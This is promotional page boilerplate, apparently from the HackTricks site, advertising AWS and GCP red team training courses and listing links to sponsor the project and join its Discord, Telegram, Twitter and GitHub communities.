Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
